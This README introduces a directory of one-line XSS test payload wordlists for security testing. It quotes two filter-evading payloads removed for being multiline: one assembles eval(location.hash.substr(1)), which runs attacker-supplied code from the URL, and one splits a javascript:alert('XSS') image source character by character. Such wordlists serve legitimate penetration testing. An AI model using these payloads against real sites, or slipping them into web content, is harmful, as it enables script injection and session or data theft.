# XSS Robot-Friendly version

This directory contains XSS you can test for. For human friendly versions, go to the [human-friendly](../human-friendly) directory.

There are some line you may need to change/take note in order for your testing process to go smoothly. (e.g. third party resources that may get flagged by WAF and the xss itself) 

Some XSS trigger condition may require you to interact with the web pages to trigger it. You should read through all the wordlists here and understand what each XSS does, then customizing it to your own needs.

`XSS-Vectors-Mario.txt` and `XSS-With-Context-Jhaddix.txt` may not work as well as before because all XSS are squished into one line and may break some xss that relies on new lines.

To see the results, look out for message popups or network activity in the devtools of your browser.

Happy hacking!

## Removed xss

### XSS-EnDe-h4k.txt

Removed because there was no way to squash it into one line

```
_
=
eval
b=1
__
=
location
c=1
_
(
__
.
hash
//
.
substr
(1)
)
```
### XSS-EnDe-xssAttacks.txt

Also removed due to it's multiline nature

```
<IMG
SRC
=
"
j
a
v
a
s
c
r
i
p
t
:
a
l
e
r
t
(
'
X
S
S
'
)
"
>
```
